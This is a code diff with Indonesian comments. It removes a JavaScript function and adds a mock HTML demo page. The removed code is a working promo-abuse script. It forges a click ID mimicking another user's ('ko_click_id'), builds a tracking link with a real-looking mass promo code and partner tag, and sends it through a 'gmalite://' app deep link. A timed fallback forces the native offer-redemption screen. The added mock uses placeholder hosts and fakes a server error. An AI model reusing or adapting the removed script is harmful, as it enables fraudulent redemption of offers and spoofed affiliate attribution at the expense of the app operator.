@@ -1,36 +1,41 @@
-function injek(offId, loyId) {
-    var mCode = "PaketNgemil12";
-    var slug = "2le1hb5pjyoo9";
-    
-    // RAHASIA: Mukidi menggunakan ko_click_id. 
-    // Kita buat ID acak yang formatnya mirip milik Mukidi (ko_ + 20 karakter alfanumerik)
-    var randomKoId = "ko_" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 10);
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>redirect</title>
+</head>
+<body>
 
-    // 1. Susun URL Tracking dengan ko_click_id
-    var trackingUrl = "https://smart.link/" + slug + 
-                      "?offer_id=" + offId + 
-                      "&loyalty_id=" + loyId + 
-                      "&code=" + mCode + 
-                      "&is_mass_code=1" +
-                      "&ko_click_id=" + randomKoId + // <--- INI KUNCINYA
-                      "&partner=Tiktok%20Live%20109.5";
+<a href="#" onclick="mockInject('123','456')">
+  Click here for Inject gmalite-smartweb
+</a>
 
-    // 2. Gunakan Protokol Smartweb untuk membungkus tracking tersebut
-    var finalLink = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(trackingUrl);
+<script>
+function mockInject(offId, loyId) {
+  const code = "DEMO_CODE";
+  const fakeClickId = "ko_demo_" + Math.random().toString(36).slice(2, 10);
 
-    // EKSEKUSI
-    window.location.href = finalLink;
+  // URL tracking PALSU
+  const trackingUrl =
+    "https://example.test/track" +
+    "?offer_id=" + offId +
+    "&loyalty_id=" + loyId +
+    "&click_id=" + fakeClickId;
 
-    // 3. EMERGENCY FALLBACK (Jika tombol masih belum muncul)
-    setTimeout(function() {
-        if (!document.hidden) {
-            // Paksa masuk ke layar konfirmasi dengan ID sesi yang sama
-            var nativeRedeem = "gmalite://offers/redeem?offer_id=" + offId + 
-                               "&loyalty_id=" + loyId + 
-                               "&code=" + mCode + 
-                               "&is_mass_code=1" +
-                               "&ko_click_id=" + randomKoId;
-            window.location.href = nativeRedeem;
-        }
-    }, 1200);
+  // Scheme PALSU (tidak terdaftar di OS)
+  const fakeScheme =
+    "demoapp://smartweb?weburl=" +
+    encodeURIComponent(trackingUrl);
+
+  // Simulasi redirect
+  console.log("Redirect to:", fakeScheme);
+
+  // Simulasi server error
+  document.body.innerHTML =
+    "<h1>500 Internal Server Error</h1>" +
+    "<p>Mock server failure after security check</p>";
 }
+</script>
+
+</body>
+</html>
